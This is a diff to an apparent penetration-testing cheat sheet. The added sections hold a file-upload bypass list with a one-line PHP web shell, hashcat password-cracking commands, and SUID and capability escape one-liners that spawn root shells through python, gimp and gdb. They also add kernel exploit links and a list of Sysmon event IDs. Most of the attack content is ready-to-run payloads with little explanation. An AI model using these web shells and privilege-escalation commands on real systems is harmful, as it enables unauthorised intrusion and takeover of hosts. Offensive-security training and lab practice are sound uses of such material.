@@ -446,11 +446,17 @@ ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -t 30 -e .php,.html,.txt -x
 
 ```bash
 Change content-type
-    * text/thml
+    * text/html
+	* image/gif
+	* image/jpeg
 extension
     * .png.php
     * .php.png
     * .php%00.png
+	* .phtml
+	
+# Php content
+<?php system($_GET['cmd']);?>
 ```
 
 ### Local File Inclusion (LFI)
@@ -689,6 +695,23 @@ https://github.com/hashcat/kwprocessor
 ./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route
 ```
 
+### Hashcat
+
+```bash
+# Command
+hashcat -m 3200 hash wordlist.txt -r best64.rule
+hashcat -m 1000 hash wordlist.txt -r all4one.rule --show --username
+```
+
+### Cauldera
+
+```bash
+# Github
+https://github.com/aaronjones111/cauldera
+
+# Command
+```
+
 ### PrivescCheck.ps1
 
 ```bash
@@ -893,6 +916,15 @@ https://lzone.de/cheat-sheet/jq
 ```code
 # Remove First Character
 echo "xtest" | cut -c2-
+
+# Remove the first occurence character
+echo $i | sed 's@/@@' # Remove '/' 
+
+# Remove the first / if got
+for i in $(cat wordlist.txt);do if [[ $i == /* ]]; then echo $i | sed 's@/@@'; else echo $i; fi;done
+
+# Loop and read from file (line by line)
+while IFS= read -r line; do echo "$line" ; done < word.txt
 ```
 
 ### Linux Alias
@@ -1577,8 +1609,39 @@ sudo remmina
 # Download
 https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
 
+# Event
+Event ID 1: Process creation
+Event ID 2: A process changed a file creation time
+Event ID 3: Network connection
+Event ID 4: Sysmon service state changed
+Event ID 5: Process terminated
+Event ID 6: Driver loaded
+Event ID 7: Image loaded
+Event ID 8: CreateRemoteThread
+Event ID 9: RawAccessRead
+Event ID 10: ProcessAccess
+Event ID 11: FileCreate
+Event ID 12: RegistryEvent (Object create and delete)
+Event ID 13: RegistryEvent (Value Set)
+Event ID 14: RegistryEvent (Key and Value Rename)
+Event ID 15: FileCreateStreamHash
+Event ID 16: ServiceConfigurationChange
+Event ID 17: PipeEvent (Pipe Created)
+Event ID 18: PipeEvent (Pipe Connected)
+Event ID 19: WmiEvent (WmiEventFilter activity detected)
+Event ID 20: WmiEvent (WmiEventConsumer activity detected)
+Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)
+Event ID 22: DNSEvent (DNS query)
+Event ID 23: FileDelete (File Delete archived)
+Event ID 24: ClipboardChange (New content in the clipboard)
+Event ID 25: ProcessTampering (Process image change)
+Event ID 26: FileDeleteDetected (File Delete logged)
+Event ID 255: Error
+
+
 # References
 https://github.com/SwiftOnSecurity/sysmon-config
+https://github.com/trustedsec/SysmonCommunityGuide
 ```
 
 ### Scp
@@ -1852,6 +1915,18 @@ getmyuid
 
 # C. SUID/CAP/SUDO/GROUP
 
+### Python
+
+```bash
+# SUID
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# Capabilities
+python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
 ### LXD
 
 ```bash
@@ -1865,6 +1940,26 @@ getmyuid
 7. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 8. lxc start ignite
 9. lxc exec ignite /bin/sh
+```
+
+### Gimp
+
+```bash
+# SUID
+gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# References
+https://gtfobins.github.io/gtfobins/gimp/
+```
+
+### Gdb
+
+```bash
+# SUID
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
+# References
+https://gtfobins.github.io/gtfobins/gdb/
 ```
 
 ### Node
@@ -2351,6 +2446,9 @@ gcc -pthread dirty.c -o dirty -lcrypt
 # < 3.19
 - https://www.exploit-db.com/exploits/37292
 
+# = 3.2.0.23 (Ubuntu 12.04)
+- https://www.exploit-db.com/exploits/33589
+
 # <= 4.4.0-116
 - https://www.exploit-db.com/exploits/44298
 
@@ -2570,6 +2668,7 @@ http://sparty.secniche.org/
 https://hackmag.com/security/sharepoint-serving-the-hacker/
 https://github.com/helloitsliam/Hacking/blob/master/SharePoint-URLs
 https://github.com/bhasbor/SharePointURLBrute-v1.1/blob/master/SharePoint-UrlExtensions-18Mar2012.txt
+https://www.youtube.com/watch?v=aXFnO_PzaIw
 ```
 
 ### Rejetto File Server
